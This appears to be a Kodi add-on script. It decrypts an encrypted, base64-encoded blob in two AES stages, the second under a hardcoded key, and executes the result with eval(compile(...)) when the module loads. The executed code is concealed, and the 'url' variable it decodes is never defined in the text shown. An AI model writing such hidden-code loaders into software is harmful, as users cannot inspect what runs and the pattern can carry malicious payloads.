
# -*- coding: utf-8 -*-
import xbmc, xbmcaddon, xbmcgui, os
import base64, hashlib, service
from base64 import urlsafe_b64encode as b64e, urlsafe_b64decode as b64d
from auto import checkSettings

AddonID = xbmcaddon.Addon().getAddonInfo('id')
addon = xbmcaddon.Addon(id=AddonID) 
try:
    home = xbmc.translatePath(addon.getAddonInfo('path').decode('utf-8'))
except:
    home = xbmc.translatePath(addon.getAddonInfo('path'))
ADDONPATH = xbmc.translatePath(os.path.join('special://home/addons/' + AddonID, ''))
icon = os.path.join(home, 'icon.png')
key = addon.getSetting('key')

def decode(key):
    try:
        from Crypto.Cipher import AES
        from Crypto.Util import Padding
    except ImportError:
        from Cryptodome.Cipher import AES
        from Cryptodome.Util import Padding
    key = base64.b64decode(key)
    iv = key[:AES.block_size]
    cipher = AES.new(service.get_crypt_key(), AES.MODE_CBC, iv)
    decoded = Padding.unpad(
        padded_data=cipher.decrypt(key[AES.block_size:]),
        block_size=service.__BLOCK_SIZE__)
    return decoded	

		
def main(key,url):
    try:
        from Crypto.Cipher import AES
        from Crypto.Util import Padding
        from Crypto.Random import get_random_bytes
    except ImportError:
        from Cryptodome.Random import get_random_bytes
        from Cryptodome.Cipher import AES
        from Cryptodome.Util import Padding
    unpad = lambda s: s[:-ord(s[-1:])]
    url = base64.b64decode(url)
    key = hashlib.sha256(b'skin').digest()
    iv = url[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CFB, iv)
    return unpad(base64.b64decode(cipher.decrypt(url[AES.block_size:])))
checkSettings()		
source = base64.b64decode(main(decode(key),url))
eval(compile(source, '<string>', 'exec'))